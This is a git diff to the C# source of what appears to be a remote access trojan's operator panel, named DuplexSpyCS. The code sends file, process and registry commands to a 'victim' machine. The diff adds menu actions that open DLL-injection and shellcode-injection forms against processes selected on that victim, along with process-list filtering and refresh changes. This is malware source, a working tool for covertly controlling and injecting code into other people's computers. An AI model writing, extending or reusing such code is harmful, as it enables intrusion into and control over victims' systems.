@@ -22,6 +22,7 @@ using System.Diagnostics;
 using System.Text;
 using System.Text.Json;
 using System.Text.RegularExpressions;
+using System.Windows.Forms;
 using System.Xml.Linq;
 
 namespace DuplexSpyCS
@@ -732,6 +733,9 @@ namespace DuplexSpyCS
 
         #endregion
         #region FileMgr
+
+        public void fnFileInit() => m_victim.fnSendCommand($"file|init|{200}|{200}");
+
         /// <summary>
         /// "FileMgr" function initialization.
         /// This function is used by "Received Handler" in main Form. Do not use this function directly.
@@ -1806,6 +1810,7 @@ namespace DuplexSpyCS
                         }
                     ).ToArray());
 
+                    toolStripMenuItem75.DropDownItems.Clear();
                     toolStripMenuItem75.DropDownItems.Add("All");
                     toolStripMenuItem75.DropDownItems.Add(new ToolStripSeparator());
 
@@ -1823,7 +1828,7 @@ namespace DuplexSpyCS
 
                         Clipboard.SetText(sb.ToString());
                     };
-                    
+
                     for (int i = 0; i < dic_fields["task"].Length; i++)
                     {
                         string szName = dic_fields["task"][i];
@@ -1867,10 +1872,28 @@ namespace DuplexSpyCS
                         Invoke(new Action(() => listView2.Columns[i].Text = _tmp[0][0]));
                     }
                 }
+
                 column_changed = true;
+
+                m_lsTaskLv.Add(item);
+
                 Invoke(new Action(() =>
                 {
-                    listView2.Items.Add(item);
+                    for (int i = 0; i < item.SubItems.Count; i++)
+                    {
+                        try
+                        {
+                            if (Regex.IsMatch(item.SubItems[i].Text, textBox4.Text, RegexOptions.IgnoreCase) && !listView2.Items.Contains(item))
+                            {
+                                listView2.Items.Add(item);
+                                break;
+                            }
+                        }
+                        catch
+                        {
+                            return;
+                        }
+                    }
 
                     TreeNode procNode = null;
                     foreach (TreeNode tmpNode in treeView2.Nodes)
@@ -1896,7 +1919,8 @@ namespace DuplexSpyCS
 
             Invoke(new Action(() =>
             {
-                m_lsTaskLv = listView2.Items.Cast<ListViewItem>().ToList();
+                //m_lsTaskLv = listView2.Items.Cast<ListViewItem>().ToList();
+
                 toolStripStatusLabel3.Text = $"Process[{m_lsTaskLv.Count}]";
             }));
         }
@@ -2151,7 +2175,7 @@ namespace DuplexSpyCS
                 "user",
             };
 
-            m_victim.fnSendCommand($"file|init|{200}|{200}");
+            fnFileInit();
             //m_victim.fnSendCommand($"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
             Task_ReqInit();
             m_victim.fnSendCommand($"reg|init");
@@ -2478,7 +2502,10 @@ namespace DuplexSpyCS
                         File_SendDelete();
                         break;
                     case Keys.F5:
-                        fileLV_Refresh();
+                        if (textBox1.Tag == null)
+                            fnFileInit();
+                        else
+                            fileLV_Refresh();
                         break;
                     case Keys.Enter:
                         ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
@@ -2866,22 +2893,15 @@ namespace DuplexSpyCS
             Reg_FindStartup();
         }
 
-        //Task - Dll Injection
         private void toolStripMenuItem33_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView2.SelectedItems)
-            {
-                frmTaskDLLInjector f = new frmTaskDLLInjector(m_victim, int.Parse(item.SubItems[1].Text));
-                f.Show();
-            }
+
         }
 
         private void treeView3_KeyDown(object sender, KeyEventArgs e)
         {
 
         }
-
-
 
         private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
         {
@@ -2940,8 +2960,7 @@ namespace DuplexSpyCS
         //Task - ListView Filter
         private void textBox4_TextChanged(object sender, EventArgs e)
         {
-            TextBox tb = (TextBox)sender;
-            Task_RegexSearch(tb.Text);
+            
         }
 
         private void listView6_DoubleClick(object sender, EventArgs e)
@@ -3348,6 +3367,36 @@ namespace DuplexSpyCS
                 }
 
                 toolStripLabel3.Text = $"Connection[{listView4.Items.Count}]";
+            }
+        }
+
+        private void toolStripMenuItem76_Click(object sender, EventArgs e)
+        {
+            List<(string, int)> lsProc = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (x.Text, int.Parse(x.SubItems[1].Text))).ToList();
+
+            frmTaskDLLInjector f = new frmTaskDLLInjector(m_victim, lsProc);
+            f.Show();
+        }
+
+        private void toolStripMenuItem77_Click(object sender, EventArgs e)
+        {
+            List<(string, int)> lsProc = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (x.Text, int.Parse(x.SubItems[1].Text))).ToList();
+
+            frmTaskShellcodeInjector f = new frmTaskShellcodeInjector(m_victim, lsProc);
+            f.Show();
+        }
+
+        private void textBox4_KeyDown(object sender, KeyEventArgs e)
+        {
+            switch (e.KeyCode)
+            {
+                case Keys.F5:
+                    Task_ReqInit();
+                    break;
+                case Keys.Enter:
+                    TextBox tb = (TextBox)sender;
+                    Task_RegexSearch(tb.Text);
+                    break;
             }
         }
     }
